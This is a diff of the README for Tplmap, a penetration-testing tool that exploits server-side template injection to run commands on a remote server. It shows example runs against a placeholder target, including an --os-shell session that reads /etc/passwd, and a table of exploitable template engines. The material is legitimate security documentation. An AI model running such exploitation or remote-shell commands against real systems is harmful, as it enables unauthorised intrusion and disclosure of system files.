@@ -1,7 +1,7 @@
 Tplmap
 ======
 
-Tplmap automates the detection and exploitation of Server-Side Template Injection (SSTI) vulnerabilities to break-out the sandbox and achieve remote command execution on the remote operating system. 
+Tplmap automates the detection and exploitation of Server-Side Template Injection (SSTI) vulnerabilities to break-out the sandbox and achieve remote command execution on the operating system. 
 
 The tool can be used as a testbed to conduct researches on the SSTI vulnerability class and as offensive security tool in penetration test engagements.
 
@@ -61,6 +61,7 @@ $ ./tplmap.py -u 'http://www.target.com/page?name=John'
 
 [+] Testing if GET parameter 'name' is injectable
 [+] Smarty plugin is testing rendering with tag '{*}'
+[+] Smarty plugin is testing blind injection
 [+] Mako plugin is testing rendering with tag '${*}'
 ...
 [+] Jinja2 plugin is testing rendering with tag '{{*}}'
@@ -91,7 +92,7 @@ $ ./tplmap.py -u 'http://www.target.com/page?name=John'
     --download REMOTE LOCAL   Download remote files
 ```
 
-Use `--os-shell` option to compromise the target in a fully automated way.
+Use `--os-shell` option to launch a pseudo-terminal on the target.
 
 ```
 $ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
@@ -102,7 +103,7 @@ $ ./tplmap.py --os-shell -u 'http://www.target.com/page?name=John'
 
 linux $ whoami
 www
-linux $ head /etc/passwd
+linux $ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -126,6 +127,7 @@ Tplmap can exploit SSTI vulnerabilities in over 15 template engines, unsandboxed
 | JavaScript (code eval) | ✓ |  ✓                | JavaScript      |  ✓        |  ✓         |
 | Dust (<= dustjs-helpers@1.5.0) | ✓ |  ✓        | JavaScript      |  ✓        |  ✓         |
 | Ruby (code eval)       | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
+| Slim                   | ✓ |  ✓                | Ruby            |  ✓        |  ✓         |
 | Smarty (unsecured)     | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
 | PHP (code eval)        | ✓ |  ✓                | PHP             |  ✓        |  ✓         |
 | Freemarker             | ✓ |  ✓                | ×               |  ✓        |  ✓         |
